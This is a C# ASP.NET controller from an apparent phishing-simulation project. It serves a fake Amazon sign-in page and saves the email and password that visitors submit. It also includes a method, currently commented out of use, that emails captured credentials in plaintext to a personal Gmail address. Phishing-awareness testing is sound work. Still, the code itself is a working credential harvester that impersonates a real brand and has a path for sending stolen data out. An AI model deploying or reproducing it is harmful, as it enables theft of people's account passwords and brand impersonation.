using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using PhishingTest.DataAccessLayer.Repository.Interfaces;
using PhishingTest.Models.Models;
using PhisingTest.BusinessLayer.Services.Interfaces;

// For more information on enabling MVC for empty projects, visit http://go.microsoft.com/fwlink/?LinkID=397860

namespace PhisingTest.Controllers
{
    public class PhishingPageController : Controller
    {
        private readonly IEmailService _EmailService;
        private readonly ICredentialRepository _CredentialRepository;

        public PhishingPageController(IEmailService emailService, ICredentialRepository credentialRepository)
        {
            _EmailService = emailService;
            _CredentialRepository = credentialRepository;
        }

        [Route("amazonsignin", Name = "AmazonSignin")]
        public IActionResult AmazonSignIn()
        {
            return View("Amazon");
        }

        [HttpPost]
        public IActionResult GetCredentials(Credential creds)
        {
            if (!ModelState.IsValid)
            {
                return RedirectToAction("Amazon");
            }

            //SendCredentials(creds);
            _CredentialRepository.SaveCredential(creds);

            return View("FailedTest");
        }

        private void SendCredentials(Credential creds)
        {
            _EmailService.SendEmailAsync("johnd.zartis@gmail.com", "Credentials Comprimised", $"Email: {creds.Email}\nPassword: {creds.Password}");
        }
    }
}
